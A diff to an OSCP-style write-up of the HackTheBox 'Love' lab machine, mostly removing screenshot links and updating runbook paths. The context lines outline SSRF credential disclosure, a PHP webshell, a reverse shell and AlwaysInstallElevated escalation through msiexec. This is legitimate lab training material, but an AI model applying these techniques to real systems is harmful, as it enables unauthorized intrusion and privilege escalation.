@@ -122,7 +122,6 @@ The scan exposed a broad standalone Windows surface:
 | 5985, 5986, 47001 | WinRM and HTTPAPI | Keep for later credential validation |
 | 5040, 7680, 49664-49670 | Unusual or dynamic Windows services | Record them and avoid treating the labels as a foothold |
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/1.nmap-allports.png>)
 SCREENSHOT: Full TCP scan. Red marks the open-port set; green marks the broad scan scope.
 
 > [!warning] 💡 Gotcha
@@ -141,7 +140,6 @@ sudo nmap -Pn -n -sC -sV --version-light \\
 
 The important results were Apache 2.4.46 with PHP 7.3.27 on ports 80, 443, and 5000; MariaDB on 3306; Windows 10 Pro indicators through SMB; and WinRM on 5985 and 5986. The web stack was the most promising branch because it exposed an identifiable PHP product.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 SCREENSHOT: Focused service scan. Red marks the Apache/PHP applications; green marks the Windows service context.
 
 ## 3. Compare the default site with the staging virtual host
@@ -158,13 +156,10 @@ curl -sS -i "http://$VHost/" | tee "$BoxDir/loot/http-staging.txt"
 
 The default site was Voting System 1.0 with a voter login form posting to `login.php`. The staging site was a separate Free File Scanner application and linked to `/beta.php`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/3.1.http-root-title.png>)
 SCREENSHOT: Default HTTP site. Red marks the Voting System title.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/3.2.http-root-login.png>)
 SCREENSHOT: Default voter login form. Red marks the `login.php` route and the `voter` and `password` fields.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/4.staging-root.png>)
 SCREENSHOT: Staging virtual host. Red marks the distinct application returned for the same target IP.
 
 > [!warning] 💡 Gotcha
@@ -195,7 +190,6 @@ curl -sS --resolve "$VHost:$WebPort:$BoxIP" \\
 
 The response contained the internal voting administration page and a message disclosing the voting administrator credential. Record the username as `$Username`, keep the password in private loot, and do not paste it into the report.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/5.staging-beta.png>)
 SCREENSHOT: Scanner form. Red marks the URL-controlled `file` field; green marks the POST action used for SSRF.
 
 > [!warning] 💡 Gotcha
@@ -216,7 +210,6 @@ curl -sS -i -c "$CookieFile" -b "$CookieFile" -L \\
 
 The valid session reached the administrator dashboard. It exposed voters, candidates, positions, ballots, votes, and configuration routes.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/8.admin-dashboard.png>)
 SCREENSHOT: Authenticated administrator dashboard. Red marks the administrative navigation; green marks the candidate and voter management routes.
 
 > [!warning] 💡 Gotcha
@@ -267,10 +260,8 @@ curl -sS -G \\
 
 The response was `love\\phoebe`, proving server-side PHP execution.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/9.upload-success.png>)
 SCREENSHOT: Accepted multipart upload. Red marks the redirect; the next command must still verify the stored file.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/10.webshell-rce.png>)
 SCREENSHOT: Webshell proof. Red marks `love\\phoebe`, the execution identity returned by `whoami`.
 
 > [!warning] 💡 Gotchas
@@ -310,7 +301,6 @@ curl -sS -G --data-urlencode \\
 
 The listener received a Windows command shell from `C:\xampp\htdocs\omrs\images`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/11.phoebe-shell.png>)
 SCREENSHOT: Initial callback. Red marks the callback and the Windows working directory.
 
 > [!warning] 💡 Gotcha
@@ -348,7 +338,6 @@ AlwaysInstallElevated    REG_DWORD    0x1
 
 The machine also had AppLocker-related system components. Direct executable execution from a user-writable location was therefore not the preferred route. Windows Installer was the relevant trusted execution path, and the two registry values supplied the privilege-escalation condition.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/12.alwaysinstalledelevated.png>)
 SCREENSHOT: Registry evidence. Red marks `AlwaysInstallElevated` in both required policy locations; green marks the `0x1` values.
 
 > [!warning] 💡 Gotcha
@@ -381,10 +370,8 @@ msiexec /quiet /qn /i C:\Windows\Temp\system-shell.msi
 
 The callback landed in `C:\Windows\System32` and returned `nt authority\system`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/13.system-shell.png>)
 SCREENSHOT: Elevated callback. Red marks the new shell and its `C:\Windows\System32` working directory.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/14.system-ptroof.png>)
 SCREENSHOT: Final identity proof. Red marks `nt authority\\system`.
 
 > [!warning] 💡 Gotcha
@@ -692,7 +679,6 @@ Content-Type: text/html; charset=UTF-8
 	<link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
 
 	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
 	<!--[if lt IE 9]>
 	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
 	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
@@ -1256,12 +1242,12 @@ Content-Type: text/html; charset=UTF-8
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Windows - Service Scan]]
-- [[RUNBOOK V2/Windows - Web Enum]]
-- [[RUNBOOK V2/Windows - Shell Received]]
-- [[RUNBOOK V2/Windows - Privilege Triage]]
-- [[RUNBOOK V2/Windows - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
+- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
+- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
+- [[OSCP/RUNBOOK V2/Windows - Clean Down]]
 
 ## Why this matters for OSCP
 
